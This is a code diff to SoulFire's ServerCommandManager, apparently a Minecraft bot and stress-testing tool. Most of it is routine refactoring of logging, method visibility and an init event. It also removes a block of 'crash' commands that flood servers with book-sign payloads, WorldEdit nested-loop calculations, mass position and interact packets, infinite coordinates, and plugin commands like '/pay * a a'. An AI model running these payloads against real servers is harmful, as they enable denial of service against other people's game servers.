@@ -25,11 +25,6 @@ import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.literal;
 import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.privateCommand;
 
 import com.github.steveice10.mc.protocol.data.game.entity.RotationOrigin;
-import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
-import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
-import com.github.steveice10.mc.protocol.packet.common.serverbound.ServerboundCustomPayloadPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
 import com.mojang.brigadier.Command;
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.DoubleArgumentType;
@@ -64,7 +59,7 @@ import net.pistonmaster.soulfire.brigadier.RedirectHelpWrapper;
 import net.pistonmaster.soulfire.server.api.SoulFireAPI;
 import net.pistonmaster.soulfire.server.api.event.EventUtil;
 import net.pistonmaster.soulfire.server.api.event.bot.BotPreTickEvent;
-import net.pistonmaster.soulfire.server.api.event.lifecycle.DispatcherInitEvent;
+import net.pistonmaster.soulfire.server.api.event.lifecycle.CommandManagerInitEvent;
 import net.pistonmaster.soulfire.server.pathfinding.BotEntityState;
 import net.pistonmaster.soulfire.server.pathfinding.RouteFinder;
 import net.pistonmaster.soulfire.server.pathfinding.execution.PathExecutor;
@@ -103,8 +98,7 @@ public class ServerCommandManager {
                     c -> {
                       c.getSource().sendInfo("Available commands:");
                       for (var command : getAllUsage(dispatcher.getRoot(), c.getSource(), false)) {
-                        c.getSource()
-                            .sendInfo(String.format("%s -> %s", command.command(), command.help()));
+                        c.getSource().sendInfo("{} -> {}", command.command(), command.help());
                       }
 
                       return Command.SINGLE_SUCCESS;
@@ -417,7 +411,9 @@ public class ServerCommandManager {
                         forEveryAttackEnsureHasBots(
                             c,
                             attackManager -> {
-                              log.info("Total bots: {}", attackManager.botConnections().size());
+                              c.getSource()
+                                  .sendInfo(
+                                      "Total bots: {}", attackManager.botConnections().size());
                               long readTraffic = 0;
                               long writeTraffic = 0;
                               for (var bot : attackManager.botConnections().values()) {
@@ -433,12 +429,14 @@ public class ServerCommandManager {
                                     trafficShapingHandler.trafficCounter().cumulativeWrittenBytes();
                               }
 
-                              log.info(
-                                  "Total read traffic: {}",
-                                  FileUtils.byteCountToDisplaySize(readTraffic));
-                              log.info(
-                                  "Total write traffic: {}",
-                                  FileUtils.byteCountToDisplaySize(writeTraffic));
+                              c.getSource()
+                                  .sendInfo(
+                                      "Total read traffic: {}",
+                                      FileUtils.byteCountToDisplaySize(readTraffic));
+                              c.getSource()
+                                  .sendInfo(
+                                      "Total write traffic: {}",
+                                      FileUtils.byteCountToDisplaySize(writeTraffic));
 
                               long currentReadTraffic = 0;
                               long currentWriteTraffic = 0;
@@ -455,12 +453,14 @@ public class ServerCommandManager {
                                     trafficShapingHandler.trafficCounter().lastWriteThroughput();
                               }
 
-                              log.info(
-                                  "Current read traffic: {}/s",
-                                  FileUtils.byteCountToDisplaySize(currentReadTraffic));
-                              log.info(
-                                  "Current write traffic: {}/s",
-                                  FileUtils.byteCountToDisplaySize(currentWriteTraffic));
+                              c.getSource()
+                                  .sendInfo(
+                                      "Current read traffic: {}/s",
+                                      FileUtils.byteCountToDisplaySize(currentReadTraffic));
+                              c.getSource()
+                                  .sendInfo(
+                                      "Current write traffic: {}/s",
+                                      FileUtils.byteCountToDisplaySize(currentWriteTraffic));
 
                               return Command.SINGLE_SUCCESS;
                             }))));
@@ -498,202 +498,16 @@ public class ServerCommandManager {
                                       Files.createDirectories(SFPathConstants.MAPS_FOLDER);
                                       var file = SFPathConstants.MAPS_FOLDER.resolve(fileName);
                                       ImageIO.write(image, "png", file.toFile());
-                                      c.getSource().sendInfo("Exported map to " + file);
+                                      c.getSource().sendInfo("Exported map to {}", file);
                                     } catch (IOException e) {
-                                      log.error("Failed to export map!", e);
+                                      c.getSource().sendError("Failed to export map!", e);
                                     }
 
                                     return Command.SINGLE_SUCCESS;
                                   });
                             }))));
 
-    dispatcher.register(
-        literal("crash")
-            .then(
-                literal("book")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with a book",
-                            c -> {
-                              log.info("Attempting to crash the server with a book");
-
-                              try {
-                                var data = Files.readAllBytes(Path.of("book.cap"));
-                                var packet = new ServerboundCustomPayloadPacket("MC|BSign", data);
-                                return forEveryBot(
-                                    c,
-                                    (bot) -> {
-                                      for (var i = 0; i < 150; i++) {
-                                        bot.sessionDataManager().sendPacket(packet);
-                                      }
-                                      return Command.SINGLE_SUCCESS;
-                                    });
-                              } catch (IOException e) {
-                                log.error("Failed to read book.cap", e);
-                                return Command.SINGLE_SUCCESS;
-                              }
-                            })))
-            .then(
-                literal("calc")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with a WorldEdit calculation",
-                            c -> {
-                              log.info(
-                                  "Attempting to crash the server with a WorldEdit calculation");
-
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-                                    bot.botControl()
-                                        .sendMessage(
-                                            "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("fly")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with flying fast",
-                            c -> {
-                              log.info("Attempting to crash the server with flying fast");
-
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-                                    var botX = bot.sessionDataManager().clientEntity().x();
-                                    var botY = bot.sessionDataManager().clientEntity().y();
-                                    var botZ = bot.sessionDataManager().clientEntity().z();
-
-                                    while (botY < 256) {
-                                      botY += 9;
-                                      var packet =
-                                          new ServerboundMovePlayerPosPacket(
-                                              true, botX, botY, botZ);
-                                      bot.sessionDataManager().sendPacket(packet);
-                                    }
-
-                                    for (var i = 0; i < 10000; i++) {
-                                      botX += 9;
-                                      var packet =
-                                          new ServerboundMovePlayerPosPacket(
-                                              true, botX, botY, botZ);
-                                      bot.sessionDataManager().sendPacket(packet);
-                                    }
-
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("sleep")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with sleeping",
-                            c -> {
-                              log.info("Attempting to crash the server with sleeping");
-
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-
-                                    // TODO: 17/02/2024 check if there is a specific packet for
-                                    // leaving bed
-                                    var packet =
-                                        new ServerboundInteractPacket(
-                                            bot.sessionDataManager().clientEntity().entityId(),
-                                            InteractAction.INTERACT,
-                                            Hand.MAIN_HAND,
-                                            false);
-
-                                    for (var i = 0; i < 2000; i++) {
-                                      bot.sessionDataManager().sendPacket(packet);
-                                    }
-
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("permissionsex")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with PermissionsEx",
-                            c -> {
-                              log.info("Attempting to crash the server with PermissionsEx");
-
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-                                    bot.botControl().sendMessage("/promote * a");
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("aac")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with AAC",
-                            c -> {
-                              log.info("Attempting to crash the server with AAC");
-                              // TODO: 17/02/2024 find old version of AAC crack to test
-                              var packet =
-                                  new ServerboundMovePlayerPosPacket(
-                                      true,
-                                      Double.NEGATIVE_INFINITY,
-                                      Double.NEGATIVE_INFINITY,
-                                      Double.NEGATIVE_INFINITY);
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-                                    bot.sessionDataManager().sendPacket(packet);
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("essentials")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with Essentials",
-                            c -> {
-                              log.info("Attempting to crash the server with Essentials");
-
-                              return forEveryBot(
-                                  c,
-                                  (bot) -> {
-                                    bot.botControl().sendMessage("/pay * a a");
-                                    return Command.SINGLE_SUCCESS;
-                                  });
-                            })))
-            .then(
-                literal("anvil")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with an anvil",
-                            c -> {
-                              log.info("Attempting to crash the server with an anvil");
-
-                              log.error("Anvil crash is not implemented yet!");
-
-                              // try damage 3 and 16384
-                              return Command.SINGLE_SUCCESS;
-                            })))
-            .then(
-                literal("chest")
-                    .executes(
-                        help(
-                            "Attempts to crash the server with a chest",
-                            c -> {
-                              log.info("Attempting to crash the server with a chest");
-
-                              log.error("Chest crash is not implemented yet!");
-
-                              // create huge NBT data on chest and place the most possible chest
-                              // to "crash" the area
-                              return Command.SINGLE_SUCCESS;
-                            }))));
-
-    SoulFireAPI.postEvent(new DispatcherInitEvent(dispatcher));
-
+    // Context commands
     dispatcher.register(
         literal("bot")
             .then(
@@ -722,7 +536,6 @@ public class ServerCommandManager {
                               return Collections.singleton(c.getSource());
                             }),
                         false)));
-
     dispatcher.register(
         literal("attack")
             .then(
@@ -751,9 +564,11 @@ public class ServerCommandManager {
                               return Collections.singleton(c.getSource());
                             }),
                         false)));
+
+    SoulFireAPI.postEvent(new CommandManagerInitEvent(this));
   }
 
-  private int forEveryAttack(
+  public int forEveryAttack(
       CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
     return forEveryAttack(context, consumer, true);
   }
@@ -794,7 +609,7 @@ public class ServerCommandManager {
     return resultCode;
   }
 
-  private int forEveryAttackEnsureHasBots(
+  public int forEveryAttackEnsureHasBots(
       CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
     return forEveryAttackEnsureHasBots(context, consumer, true);
   }
@@ -818,7 +633,7 @@ public class ServerCommandManager {
         printMessages);
   }
 
-  private int forEveryBot(
+  public int forEveryBot(
       CommandContext<ConsoleSubject> context, ToIntFunction<BotConnection> consumer) {
     return forEveryBot(context, consumer, true);
   }
@@ -858,7 +673,7 @@ public class ServerCommandManager {
         printMessages);
   }
 
-  private int executePathfinding(CommandContext<ConsoleSubject> context, GoalScorer goalScorer) {
+  public int executePathfinding(CommandContext<ConsoleSubject> context, GoalScorer goalScorer) {
     return forEveryBot(
         context,
         bot -> {
